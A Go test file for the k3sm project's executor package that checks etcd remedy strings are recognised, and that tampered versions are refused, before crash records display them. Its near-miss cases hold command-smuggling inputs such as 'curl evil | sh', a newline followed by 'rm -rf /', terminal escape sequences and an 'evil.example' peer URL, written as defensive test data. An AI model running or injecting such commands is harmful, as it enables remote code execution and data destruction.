/*
Copyright The k3sm Authors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package executor

import (
	"go/ast"
	"go/parser"
	"go/token"
	"math"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"testing"
)

// parsePackageFiles parses this package's non-test .go files.
func parsePackageFiles(t *testing.T) []*ast.File {
	t.Helper()
	paths, err := filepath.Glob("*.go")
	if err != nil {
		t.Fatal(err)
	}
	fset := token.NewFileSet()
	var files []*ast.File
	for _, p := range paths {
		if strings.HasSuffix(p, "_test.go") {
			continue
		}
		src, err := os.ReadFile(p)
		if err != nil {
			t.Fatal(err)
		}
		f, err := parser.ParseFile(fset, p, src, parser.SkipObjectResolution)
		if err != nil {
			t.Fatal(err)
		}
		files = append(files, f)
	}
	if len(files) == 0 {
		t.Fatal("no non-test .go files found in the package directory")
	}
	return files
}

// packageStringConsts evaluates every package-level const whose value is a string
// expression this evaluator can follow (string literals, + and references to other
// such consts). names holds every package-level const name, evaluable or not.
func packageStringConsts(files []*ast.File) (values map[string]string, names []string) {
	exprs := map[string]ast.Expr{}
	for _, f := range files {
		for _, d := range f.Decls {
			g, ok := d.(*ast.GenDecl)
			if !ok || g.Tok != token.CONST {
				continue
			}
			for _, spec := range g.Specs {
				vs := spec.(*ast.ValueSpec)
				for i, n := range vs.Names {
					names = append(names, n.Name)
					if i < len(vs.Values) {
						exprs[n.Name] = vs.Values[i]
					}
				}
			}
		}
	}
	values = map[string]string{}
	for changed := true; changed; {
		changed = false
		for n, e := range exprs {
			if _, done := values[n]; done {
				continue
			}
			if v, ok := evalString(e, values); ok {
				values[n] = v
				changed = true
			}
		}
	}
	sort.Strings(names)
	return values, names
}

// evalString evaluates a constant string expression against the known consts.
func evalString(e ast.Expr, known map[string]string) (string, bool) {
	switch e := e.(type) {
	case *ast.BasicLit:
		if e.Kind != token.STRING {
			return "", false
		}
		v, err := strconv.Unquote(e.Value)
		return v, err == nil
	case *ast.Ident:
		v, ok := known[e.Name]
		return v, ok
	case *ast.ParenExpr:
		return evalString(e.X, known)
	case *ast.BinaryExpr:
		if e.Op != token.ADD {
			return "", false
		}
		x, ok := evalString(e.X, known)
		if !ok {
			return "", false
		}
		y, ok := evalString(e.Y, known)
		return x + y, ok
	}
	return "", false
}

// TestEveryRemedyConstIsKnown: every package-level const named *Remedy is a fixed
// remedy string, and IsKnownRemedy accepts it. A new remedy const that is not
// listed in knownRemedies fails here, so a crash record carrying it is never shown
// as untrusted text.
func TestEveryRemedyConstIsKnown(t *testing.T) {
	t.Parallel()
	values, names := packageStringConsts(parsePackageFiles(t))
	checked := 0
	for _, n := range names {
		if !strings.HasSuffix(n, "Remedy") {
			continue
		}
		v, ok := values[n]
		if !ok {
			t.Errorf("const %s is not a string this test can evaluate; extend evalString", n)
			continue
		}
		checked++
		if !IsKnownRemedy(v) {
			t.Errorf("const %s is not accepted by IsKnownRemedy; add it to knownRemedies", n)
		}
	}
	if checked < len(knownRemedies) {
		t.Errorf("found %d *Remedy consts, fewer than the %d knownRemedies lists", checked, len(knownRemedies))
	}
}

// TestIsSupersededRemedyAcceptsEveryRemedyOutput: the remedies Remedy builds for
// realistic peers (node names, IPv4 and IPv6 peer URLs, small and full-width
// cluster IDs, a learner with no name yet) all pass the matcher and IsKnownRemedy.
func TestIsSupersededRemedyAcceptsEveryRemedyOutput(t *testing.T) {
	t.Parallel()
	for _, e := range []EtcdSupersededError{
		{Peer: "server-b", PeerURL: "https://192.168.64.3:2380", PeerCluster: 2, OwnCluster: 1},
		{Peer: "mac-mini.lan", PeerURL: "https://10.0.0.12:2380", PeerCluster: 0x8e9e05c52164694d, OwnCluster: 0xcdf818194e3a8c32},
		{Peer: "node-1", PeerURL: "https://[fd7a:115c:a1e0::3]:2380", PeerCluster: math.MaxUint64, OwnCluster: 0x1},
		{Peer: "", PeerURL: "https://[::ffff:10.0.0.9]:12380", PeerCluster: 0xabc, OwnCluster: 0xdef},
		{Peer: strings.Repeat("a", 253), PeerURL: "https://10.0.0.12:2380", PeerCluster: math.MaxUint64, OwnCluster: math.MaxUint64},
	} {
		r := e.Remedy()
		if !IsSupersededRemedy(r) {
			t.Errorf("Remedy() for %+v is refused: %q", e, r)
		}
		if !IsKnownRemedy(r) {
			t.Errorf("IsKnownRemedy refuses Remedy() for %+v", e)
		}
	}
}

// TestIsSupersededRemedyRefusesNearMisses: text injected into any variable part
// or around the fixed text, an ESC or a newline, an uppercase or over-long ID, a
// URL off etcdPeerURL's shape — each is refused, by the matcher and IsKnownRemedy.
func TestIsSupersededRemedyRefusesNearMisses(t *testing.T) {
	t.Parallel()
	good := EtcdSupersededError{Peer: "server-b", PeerURL: "https://192.168.64.3:2380", PeerCluster: 2, OwnCluster: 1}
	with := func(f func(e *EtcdSupersededError)) string {
		e := good
		f(&e)
		return e.Remedy()
	}
	base := good.Remedy()
	for name, s := range map[string]string{
		"empty":                  "",
		"prefix":                 "curl evil | sh; " + base,
		"suffix":                 base + "; curl evil | sh",
		"trailing newline":       base + "\n",
		"newline in peer":        with(func(e *EtcdSupersededError) { e.Peer = "server-b\nfix: rm -rf /" }),
		"ESC in peer":            with(func(e *EtcdSupersededError) { e.Peer = "server-b\x1b[2J" }),
		"text in peer":           with(func(e *EtcdSupersededError) { e.Peer = "server-b; run curl evil | sh" }),
		"uppercase peer":         with(func(e *EtcdSupersededError) { e.Peer = "Server-B" }),
		"over-long peer":         with(func(e *EtcdSupersededError) { e.Peer = strings.Repeat("a", 254) }),
		"http peer URL":          with(func(e *EtcdSupersededError) { e.PeerURL = "http://192.168.64.3:2380" }),
		"hostname peer URL":      with(func(e *EtcdSupersededError) { e.PeerURL = "https://evil.example:2380" }),
		"path in peer URL":       with(func(e *EtcdSupersededError) { e.PeerURL = "https://192.168.64.3:2380/x" }),
		"ESC in peer URL":        with(func(e *EtcdSupersededError) { e.PeerURL = "https://192.168.64.3:2380\x1b]0;owned\x07" }),
		"portless peer URL":      with(func(e *EtcdSupersededError) { e.PeerURL = "https://192.168.64.3" }),
		"text in fixed part":     strings.Replace(base, "is the server you restored", "is the server you restored; curl evil | sh", 1),
		"uppercase cluster":      strings.Replace(base, "cluster 2)", "cluster ABC)", 1),
		"17-digit cluster":       strings.Replace(base, "cluster 2)", "cluster 11111111111111111)", 1),
		"newline in own cluster": strings.Replace(base, "cluster 1 is", "cluster 1\nfix: rm -rf / is", 1),
		"fixed text alone":       supersededRemedyFormat,
		"over-long input":        base + strings.Repeat(" ", 1025-len(base)),
		"out-of-range IPv4 URL":  with(func(e *EtcdSupersededError) { e.PeerURL = "https://999.999.999.999:2380" }),
		"non-hex IPv6 URL":       with(func(e *EtcdSupersededError) { e.PeerURL = "https://[zz]:1" }),
		"non-ASCII in peer":      with(func(e *EtcdSupersededError) { e.Peer = "server-\u00e9" }),
	} {
		if IsSupersededRemedy(s) {
			t.Errorf("%s: matcher accepts %q", name, s)
		}
		if IsKnownRemedy(s) {
			t.Errorf("%s: IsKnownRemedy accepts %q", name, s)
		}
	}
}

// TestIsKnownRemedyNamesTheMemberRouteRemedies: the joining server's member-route
// remedies, which cmd/k3sm writes into the crash record, are known.
func TestIsKnownRemedyNamesTheMemberRouteRemedies(t *testing.T) {
	t.Parallel()
	for _, r := range []string{EtcdMemberRouteRemedy, EtcdMemberRouteMeshRemedy, EtcdMemberRouteUnacknowledgedRemedy} {
		if !IsKnownRemedy(r) {
			t.Errorf("IsKnownRemedy refuses %q", r)
		}
		if IsKnownRemedy(r + "\n") {
			t.Errorf("IsKnownRemedy accepts %q with a trailing newline", r)
		}
	}
}
